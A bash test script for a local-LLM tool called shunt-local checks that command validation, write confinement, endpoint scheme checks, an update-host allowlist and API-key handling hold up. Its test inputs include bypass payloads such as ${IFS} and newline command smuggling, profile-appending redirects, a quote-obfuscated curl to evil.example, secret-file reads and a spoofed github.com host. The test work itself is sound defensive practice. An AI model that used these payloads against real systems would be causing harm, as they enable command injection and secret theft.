#!/bin/bash
# Security regression evals for shunt-local.
#
# Covers the hardening added after the security audit:
#   - test/rollback command validation (no shell metacharacter bypass, no exfil)
#   - write confinement (dotfiles, VCS/CI/lockfiles) in task-exec and code-write
#   - endpoint scheme validation
#   - supply-chain host allowlist for shunt-update
#   - API key kept out of the curl argument vector

set -euo pipefail
export SHUNT_ASSUME_YES=true

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PLUGIN_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

WORKDIR="$(mktemp -d)"
WORKDIR="$(cd "$WORKDIR" && pwd -P)"
trap 'rm -rf "$WORKDIR"' EXIT

PASSED=0
FAILED=0

check() {
  local name="$1" expected="$2" actual="$3" desc="$4"
  if [ "$expected" = "$actual" ]; then
    printf "  \033[32mPASS\033[0m  %-30s %s\n" "$name" "$desc"
    PASSED=$((PASSED + 1))
  else
    printf "  \033[31mFAIL\033[0m  %-30s expected=[%s] got=[%s]\n" "$name" "$expected" "$actual"
    FAILED=$((FAILED + 1))
  fi
}

echo "Security Evals"
echo "────────────────────────────────────────────────────────────────"

mkdir -p "$WORKDIR/bin" "$WORKDIR/home" "$WORKDIR/work"
echo "SUPER-SECRET-VALUE" > "$WORKDIR/home/fake_secret"
printf 'x = 1\n' > "$WORKDIR/work/mod.py"
printf 'x = 1\n' > "$WORKDIR/work/ref.py"
printf 'import sys\nsys.exit(0)\n' > "$WORKDIR/legit_test.py"

# Mock curl: logs its argv (for the API-key test) and returns valid LLM JSON.
cat > "$WORKDIR/bin/curl" <<'MOCK'
#!/bin/bash
printf '%s\n' "$*" >> "${CURL_ARG_LOG:-/dev/null}"
if [[ "$*" == *"/v1/models"* ]]; then echo '{"data": []}'; exit 0; fi
printf '%s' '{"choices":[{"message":{"role":"assistant","content":"```mod.py\nx = 1\n```"}}]}'
MOCK
chmod +x "$WORKDIR/bin/curl"

# ---- 1. Command validation: metacharacter / exfil bypasses must be blocked ----
run_task_exec() {
  local payload="$1"
  rm -f "$WORKDIR/marker" "$WORKDIR/home/.profile"
  set +e
  (
    cd "$WORKDIR/work"
    HOME="$WORKDIR/home" SHUNT_MOCK_ONLINE=1 PATH="$WORKDIR/bin:$PATH" \
      "$PLUGIN_DIR/scripts/task-exec" \
      --instruction "noop" --files "$WORKDIR/work/mod.py" \
      --test-cmd "$payload" --max-retries 1 > "$WORKDIR/out.json" 2> "$WORKDIR/err.txt"
  )
  RC=$?
  set -e
  if grep -q "BLOCKED" "$WORKDIR/err.txt"; then BLOCKED=yes; else BLOCKED=no; fi
}

run_task_exec "echo pwned > $WORKDIR/marker"
check "redirect-blocked" "yes" "$BLOCKED" "redirection (>) is rejected"
check "redirect-no-file" "absent" "$([ -f "$WORKDIR/marker" ] && echo present || echo absent)" "no file written by redirect"

run_task_exec "true
touch $WORKDIR/marker"
check "newline-blocked" "yes" "$BLOCKED" "newline command chaining is rejected"

run_task_exec "touch\${IFS}$WORKDIR/marker"
check "ifs-blocked" "yes" "$BLOCKED" "\${IFS} expansion is rejected"

run_task_exec 'echo pwned >> $HOME/.profile'
check "home-var-blocked" "yes" "$BLOCKED" "\$HOME expansion is rejected"
check "home-var-no-write" "absent" "$([ -f "$WORKDIR/home/.profile" ] && echo present || echo absent)" "no dotfile write"

run_task_exec "rm -rf ./does-not-exist"
check "relative-rm-blocked" "yes" "$BLOCKED" "relative rm -rf is rejected"

run_task_exec "cat $WORKDIR/home/fake_secret"
check "cat-exfil-blocked" "yes" "$BLOCKED" "cat (secret exfiltration) is rejected"
secret_leaked=$(cat "$WORKDIR/out.json" 2>/dev/null | grep -c "SUPER-SECRET-VALUE" || true)
check "cat-no-leak" "0" "$secret_leaked" "secret never reaches the result payload"

run_task_exec "c''url http://evil.example/x"
check "quoted-curl-blocked" "yes" "$BLOCKED" "quote-concatenated program name is rejected"

run_task_exec "python3 -c pass"
check "inline-python-blocked" "yes" "$BLOCKED" "inline interpreter evaluation is rejected"

# A legitimate test command must still run.
run_task_exec "python3 -B $WORKDIR/legit_test.py"
check "legit-command-allowed" "no" "$BLOCKED" "simple test command is not blocked"

# ---- 2. Write confinement: dotfiles and sensitive project files ----
mkdir -p "$WORKDIR/work/.git/hooks" "$WORKDIR/work/.github/workflows"
set +e
(
  cd "$WORKDIR/work"
  HOME="$WORKDIR/home" SHUNT_MOCK_ONLINE=1 PATH="$WORKDIR/bin:$PATH" \
    "$PLUGIN_DIR/scripts/task-exec" \
    --instruction "noop" --files "$WORKDIR/work/.git/hooks/pre-commit" \
    --max-retries 1 > "$WORKDIR/out_git.json" 2>/dev/null
)
set -e
check "git-hook-not-written" "absent" "$([ -f "$WORKDIR/work/.git/hooks/pre-commit" ] && echo present || echo absent)" "task-exec refuses writes into .git/"

set +e
(
  cd "$WORKDIR/work"
  HOME="$WORKDIR/home" SHUNT_MOCK_ONLINE=1 PATH="$WORKDIR/bin:$PATH" \
    "$PLUGIN_DIR/scripts/task-exec" \
    --instruction "noop" --files "$WORKDIR/work/.github/workflows/ci.yml" \
    --max-retries 1 > "$WORKDIR/out_ci.json" 2>/dev/null
)
set -e
check "ci-file-not-written" "absent" "$([ -f "$WORKDIR/work/.github/workflows/ci.yml" ] && echo present || echo absent)" "task-exec refuses writes into .github/"

# code-write must refuse home dotfiles even when CWD == HOME.
(
  cd "$WORKDIR/home"
  printf 'original\n' > "$WORKDIR/home/.profile"
  set +e
  HOME="$WORKDIR/home" PATH="$WORKDIR/bin:$PATH" \
    "$PLUGIN_DIR/scripts/code-write" --spec "x" --reference "$WORKDIR/home/.profile" \
    --target "$WORKDIR/home/.profile" > /dev/null 2> "$WORKDIR/cw_err.txt"
  set -e
)
if grep -q "refusing to write to a home dotfile" "$WORKDIR/cw_err.txt"; then cw_dot=yes; else cw_dot=no; fi
check "code-write-dotfile" "yes" "$cw_dot" "code-write refuses home dotfiles"
check "code-write-dotfile-intact" "original" "$(head -1 "$WORKDIR/home/.profile")" "dotfile content unchanged"

# Normal code-write still works.
set +e
(
  cd "$WORKDIR/work"
  HOME="$WORKDIR/home" PATH="$WORKDIR/bin:$PATH" \
    "$PLUGIN_DIR/scripts/code-write" --spec "x" --reference "$WORKDIR/work/ref.py" \
    --target "$WORKDIR/work/normal.py" > /dev/null 2>&1
)
set -e
check "code-write-normal" "present" "$([ -f "$WORKDIR/work/normal.py" ] && echo present || echo absent)" "normal in-CWD write still works"

# ---- 3. Endpoint scheme validation ----
scheme_check() {
  local ep="$1"
  SHUNT_ENDPOINT="$ep" SHUNT_ALLOW_REMOTE=true bash -c \
    '. "'"$PLUGIN_DIR"'/scripts/lib/local-llm.sh" >/dev/null 2>&1; shunt_validate_endpoint "$SHUNT_ENDPOINT"' \
    >/dev/null 2>&1 && echo allowed || echo blocked
}
check "gopher-blocked" "blocked" "$(scheme_check 'gopher://evil.example/x')" "gopher:// scheme rejected"
check "file-blocked" "blocked" "$(scheme_check 'file:///etc/passwd')" "file:// scheme rejected"
check "ftp-blocked" "blocked" "$(scheme_check 'ftp://evil.example/x')" "ftp:// scheme rejected"
check "remote-http-blocked" "blocked" "$(scheme_check 'http://evil.example/x')" "remote plain HTTP still rejected"
check "localhost-allowed" "allowed" "$(scheme_check 'http://127.0.0.1:8080/v1/chat/completions')" "localhost HTTP allowed"

# ---- 4. shunt-update trusted-remote hostname allowlist ----
HOSTREPO="$WORKDIR/hostrepo"
mkdir -p "$HOSTREPO/scripts/lib" "$HOSTREPO/plugins/opencode"
cp "$PLUGIN_DIR/scripts/shunt-update" "$HOSTREPO/scripts/shunt-update"
cp "$PLUGIN_DIR/scripts/lib/update-verify.sh" "$HOSTREPO/scripts/lib/update-verify.sh"
cp "$PLUGIN_DIR/plugins/opencode/shunt-local.ts" "$HOSTREPO/plugins/opencode/shunt-local.ts"
(
  cd "$HOSTREPO"
  git init -q
  git remote add origin "https://github.com.evil.example/repo"
)
set +e
HOME="$WORKDIR/home" GIT_TERMINAL_PROMPT=0 GIT_ASKPASS=/bin/true \
  bash "$HOSTREPO/scripts/shunt-update" > "$WORKDIR/update_out.txt" 2>&1
set -e
if grep -q "Refusing to pull from untrusted remote" "$WORKDIR/update_out.txt"; then upd=yes; else upd=no; fi
check "untrusted-remote-refused" "yes" "$upd" "suffix-spoofed host (github.com.evil.example) is refused"

# ---- 5. API key must not appear in the process argument vector ----
: > "$WORKDIR/curl_args.log"
set +e
( cd "$WORKDIR/work" && CURL_ARG_LOG="$WORKDIR/curl_args.log" SHUNT_API_KEY="sk-topsecret-123" PATH="$WORKDIR/bin:$PATH" \
    "$PLUGIN_DIR/scripts/bulk-read" --question "q" --paths "$WORKDIR/work/mod.py" ) \
  > /dev/null 2>&1
set -e
if grep -q -- "--config" "$WORKDIR/curl_args.log" && ! grep -q "sk-topsecret-123" "$WORKDIR/curl_args.log"; then key_safe=yes; else key_safe=no; fi
check "api-key-not-in-argv" "yes" "$key_safe" "API key passed via --config, not argv"

echo ""
echo "## $PASSED $FAILED"
echo "Results: $PASSED passed, $FAILED failed"
[ "$FAILED" -eq 0 ] || exit 1
